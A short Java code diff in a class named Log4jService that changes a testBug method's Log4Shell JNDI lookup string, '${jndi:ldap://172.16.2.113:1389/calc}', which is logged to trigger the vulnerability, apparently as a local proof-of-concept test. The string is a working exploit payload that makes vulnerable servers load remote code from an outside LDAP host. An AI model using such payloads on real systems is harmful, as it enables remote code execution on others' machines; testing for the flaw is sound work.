@@ -15,7 +15,8 @@ public class Log4jService {
 
 
     public void testBug(){
-        String target = "${jndi:ldap://172.16.2.113:1389/cvywm1}";
+//        String target = "${jndi:ldap://172.16.2.113:1389/cvywm1}";
+        String target = "${jndi:ldap://172.16.2.113:1389/calc}";
         logger.error("test log4j bug ... 1");
         logger.error("params : {}" , target);
         logger.error("test log4j bug ... 3");
